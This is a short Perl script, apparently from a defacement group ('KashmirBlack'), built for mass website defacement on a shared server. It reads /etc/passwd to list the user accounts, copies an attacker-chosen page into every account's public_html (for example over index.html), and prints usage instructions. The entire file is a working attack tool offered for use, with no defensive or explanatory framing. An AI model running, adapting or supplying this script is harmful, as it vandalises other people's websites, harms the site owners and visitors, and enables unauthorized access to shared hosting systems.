#!/usr/bin/perl
#PhantomGhost
#CodedBy Exect1337 | KashmirBlack

if(defined($ARGV[0] and $ARGV[1])){
print "  | MASS DEFACE BY KASHMIR BLACK|  \n\n";
sleep(2);
my (@userlist, $passwd, $user, @nowdeface, $mydefacescript, $intout);

$mydefacescript = $ARGV[0];
$intout = $ARGV[1];
$passwd = '/etc/passwd';

if(!(-e $mydefacescript)){
print "file $mydefacescript not found here\n";
exit;
}
open($user,"<$passwd") || die($!);
@userlist = <$user>;
close($user);
@nowdeface = grep { !/^$/ } @userlist;

my $end = scalar(@nowdeface);
for($i = 0; $i < $end; $i++){
my $defacethisuser = @nowdeface[$i];
$defacethisuser =~ m/^([A-Za-z0-9]+)/g;
print $1."\n";
system("cp","".$mydefacescript."","/home/".$1."/public_html/".$intout."");
}
print "\n\+Done\n";
}
else{
print "

How To Use :

perl msdeface.pl mydeface-script.txt index.html\n";
exit;
}